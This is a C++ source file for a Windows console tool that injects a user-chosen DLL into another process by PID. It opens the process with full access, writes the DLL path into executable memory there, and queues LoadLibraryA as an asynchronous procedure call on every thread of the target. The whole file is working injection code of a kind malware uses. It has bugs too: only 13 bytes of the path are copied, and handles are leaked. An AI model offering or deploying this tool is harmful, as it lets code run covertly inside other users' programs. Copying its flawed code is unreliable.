// APC_Inject.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdlib.h>
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>

// LoadLibraryA 函数字符串;
TCHAR g_szBuffer[13] = { 'L', 'o' , 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0};
// 存储模块地址;
TCHAR g_szModulePath[MAX_PATH] = { 0 };
// 存储OpenThread及QueueUserAPC模块句柄;
HMODULE g_hModule = NULL;
HMODULE g_hModuleAPC = NULL;

BOOL ApcInject(DWORD dwPid)
{
	// 给需要使用的函数指针赋值;
	g_hModule = (HMODULE)GetProcAddress(GetModuleHandle("kernel32.dll"), "OpenThread");
	HANDLE (WINAPI *pOpenThread)(DWORD, BOOL, DWORD) = (HANDLE (WINAPI *)(DWORD, BOOL, DWORD))g_hModule;
	g_hModuleAPC = (HMODULE)GetProcAddress(GetModuleHandle("kernel32.dll"), "QueueUserAPC");
	DWORD (WINAPI *pQueueUserAPC)(DWORD, HANDLE, ULONG) = (DWORD (WINAPI *)(DWORD, HANDLE, ULONG))g_hModuleAPC;
	HANDLE hProcess = NULL;
	// 打开目标进程获取进程句柄;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, dwPid);
	if (!hProcess)
	{
		return -1;
	}
	// 在目标进程中申请0xD长度的空间用于存储模块路径;
	LPVOID lpImageBuffer = VirtualAllocEx(hProcess, NULL, 0xD, MEM_RESERVE | MEM_COMMIT , PAGE_EXECUTE_READWRITE);
	if (!lpImageBuffer)
	{
		return -2;
	}
	// 将模块路径写入到目标进程;
	if (!WriteProcessMemory(hProcess, lpImageBuffer, g_szModulePath, 0xD, NULL)) 
	{
		return -3;
	}
	// 遍历目标进程的全部线程;
	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPid);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
	{
		return -4;
	}
	THREADENTRY32 stThreadEntry32 = { 0 };
	stThreadEntry32.dwSize = sizeof(THREADENTRY32);
	if (!Thread32First(hThreadSnap, &stThreadEntry32))
	{
		CloseHandle(hThreadSnap);
		return -5;
	}
	do
	{
		// 遍历进程，得到指定进程的全部线程句柄;
		if (stThreadEntry32.th32OwnerProcessID == dwPid)
		{
			HANDLE hThread = pOpenThread(THREAD_ALL_ACCESS, NULL, stThreadEntry32.th32ThreadID);
			if (!hThread)
			{
				continue;
			}
			// 将用户模式 异步过程调用 (APC) 对象添加到指定线程的 APC 队列
			pQueueUserAPC((DWORD)LoadLibraryA, hThread, (ULONG)lpImageBuffer);
		}
	} while (Thread32Next(hThreadSnap, &stThreadEntry32));
	CloseHandle(hThreadSnap);
	return 0;
}

int main(int argc, char* argv[])
{
	printf("PID:\n");
	int nPid = NULL;
	scanf("%d", &nPid);
	printf("ModulePath:\n");
	scanf("%s", g_szModulePath);
	ApcInject(nPid);

	system("pause");
	return 0;
}